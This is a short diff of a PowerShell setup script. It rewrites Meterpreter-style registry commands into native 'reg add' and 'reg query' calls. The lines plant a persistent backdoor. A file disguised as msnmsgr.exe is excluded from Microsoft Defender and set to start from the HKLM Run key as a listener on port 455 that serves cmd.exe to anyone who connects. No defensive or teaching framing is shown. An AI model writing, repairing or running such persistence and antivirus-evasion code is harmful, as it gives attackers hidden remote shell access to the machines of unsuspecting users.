@@ -54,10 +54,10 @@ Write-Host "4/10: Setting up System Startup..."
 Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 
 # Set the program to run at startup using the Windows registry
-reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v msnmsgr -d 'c:\\windows\\system32\\msnmsgr.exe -Ldp 455 -e cmd.exe'
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "msnmsgr" /d "c:\windows\system32\msnmsgr.exe -Ldp 455 -e cmd.exe" /f
 
 # Query the value in the registry to confirm it has been set
-reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v msnmsgr
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "msnmsgr"
 
 
 # 5/10: Adding Firewall Rule
